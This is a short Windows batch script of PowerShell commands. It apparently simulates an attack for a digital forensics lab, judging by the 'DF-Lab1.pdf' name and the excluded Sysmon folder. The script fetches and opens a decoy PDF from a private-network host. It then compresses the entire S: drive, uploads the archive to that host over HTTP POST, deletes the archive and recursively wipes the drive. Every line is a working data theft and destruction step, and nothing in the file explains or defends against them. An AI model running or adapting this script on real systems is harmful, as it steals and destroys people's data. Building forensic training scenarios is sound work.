@echo off

powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://172.16.25.144:5001/download/DF-Lab1.pdf' -OutFile '%~dp0DF-Lab1.pdf' -UseBasicParsing"

powershell -NoProfile -Command "Start-Process -FilePath '%~dp0DF-Lab1.pdf'"

powershell -NoProfile -Command "Start-Sleep -Seconds 20"

powershell -NoProfile -Command "Get-ChildItem -LiteralPath 'S:\' -Force | Where-Object { $_.Name -notin @('$RECYCLE.BIN', 'System Volume Information', 'phoenix_staging.zip', 'Sysmon') } |Compress-Archive -DestinationPath 'S:\phoenix_staging.zip' -Force -Verbose"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://172.16.25.144:5001/uploaded/phoenix_staging.zip' -Method POST -InFile 'phoenix_staging.zip' -ContentType 'application/octet-stream' -UseBasicParsing"

powershell -NoProfile -Command "Remove-Item -Path 'S:\phoenix_staging.zip' -Force -ErrorAction SilentlyContinue"
powershell -NoProfile -Command "Get-ChildItem -Path 'S:\*' -Exclude '$RECYCLE.BIN','System Volume Information','Sysmon' | Remove-Item -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue"
